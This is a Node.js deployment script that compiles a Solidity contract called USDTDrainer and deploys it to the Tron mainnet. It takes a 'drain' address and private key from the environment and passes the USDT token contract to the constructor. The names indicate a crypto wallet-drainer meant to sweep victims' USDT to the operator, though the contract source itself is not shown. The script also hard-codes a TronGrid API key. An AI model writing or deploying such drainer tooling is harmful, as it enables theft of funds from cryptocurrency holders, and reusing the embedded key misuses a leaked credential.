require('dotenv').config();
const {TronWeb} = require('tronweb');
const fs = require('fs');
const solc = require('solc');
const USDT = process.env.USDT_CONTRACT;
const OWNER = process.env.DRAIN_ADDRESS;
const PK = process.env.DRAIN_PRIVATE_KEY;

async function main() {
  const src = fs.readFileSync('contracts/Drainer.sol','utf8');
  const inp = JSON.stringify({language:'Solidity',sources:{'Drainer.sol':{content:src}},settings:{outputSelection:{'*':{'*':['abi','evm.bytecode.object']}}}});
  const out = JSON.parse(solc.compile(inp));
  const c = out.contracts['Drainer.sol']['USDTDrainer'];
  if (!c) { console.log('compile error',JSON.stringify(out.errors)); return; }

  const tw = new TronWeb({fullHost:'https://api.trongrid.io',headers:{'TRON-PRO-API-KEY':'855c6101-72ba-41f3-932e-298e53aac3d1'},privateKey:PK});

  const tx = await tw.transactionBuilder.createSmartContract({
    abi: JSON.stringify(c.abi),
    bytecode: '0x' + c.evm.bytecode.object,
    feeLimit: 1000000000,
    callValue: 0,
    ownerAddress: OWNER,
    parameters: [USDT, OWNER]
  });

  const signed = await tw.trx.sign(tx);
  const receipt = await tw.trx.sendRawTransaction(signed);
  console.log('receipt:', JSON.stringify(receipt));
  if (receipt.code && receipt.code !== 'SUCCESS') { console.log('FAIL'); return; }
  const addr = tw.address.fromHex(tx.contract_address || receipt.contract_address);
  console.log('CONTRACT_ADDRESS:', addr);
}
main().catch(e=>console.error(e));
